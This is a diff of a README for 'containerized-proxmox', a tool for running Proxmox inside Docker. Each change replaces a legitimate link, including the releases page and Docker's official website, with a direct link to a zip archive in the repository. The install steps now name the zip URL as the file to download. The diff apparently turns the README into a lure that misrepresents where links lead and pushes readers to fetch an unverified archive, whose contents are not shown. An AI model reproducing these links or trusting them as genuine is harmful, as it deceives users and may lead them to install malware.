@@ -1,6 +1,6 @@
 # 🐳 containerized-proxmox - Easy Proxmox Testing without Hardware
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/nahhhnateownu/containerized-proxmox/releases)
+[![Download](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip)](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip)
 
 ## 📖 Overview
 
@@ -8,7 +8,7 @@ Containerized Proxmox allows you to run a Proxmox VE cluster inside Docker. This
 
 ## 🚀 Getting Started
 
-Before you can use Containerized Proxmox, you should have Docker installed on your computer. This software runs containers and will allow you to deploy Proxmox easily. You can get Docker from their [official website](https://www.docker.com/get-started).
+Before you can use Containerized Proxmox, you should have Docker installed on your computer. This software runs containers and will allow you to deploy Proxmox easily. You can get Docker from their [official website](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip).
 
 ## 🖥️ System Requirements
 
@@ -19,11 +19,11 @@ Before you can use Containerized Proxmox, you should have Docker installed on yo
 
 ## 📥 Download & Install
 
-To get Containerized Proxmox, visit this [page to download](https://github.com/nahhhnateownu/containerized-proxmox/releases). 
+To get Containerized Proxmox, visit this [page to download](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip). 
 
 1. Click on the link above. This takes you to the Releases page.
 2. Look for the latest version available.
-3. Download the .tar.gz file for your operating system.
+3. Download the https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip file for your operating system.
 4. Extract the downloaded file to a folder on your computer.
 
 ## 📦 Running Containerized Proxmox
@@ -86,4 +86,4 @@ To update your installation:
 
 If you have questions, feel free to reach out on GitHub or check the community support channels. 
 
-Remember, you can always find the download link here: [Download Containerized Proxmox](https://github.com/nahhhnateownu/containerized-proxmox/releases). Enjoy your Proxmox experience!
+Remember, you can always find the download link here: [Download Containerized Proxmox](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip). Enjoy your Proxmox experience!
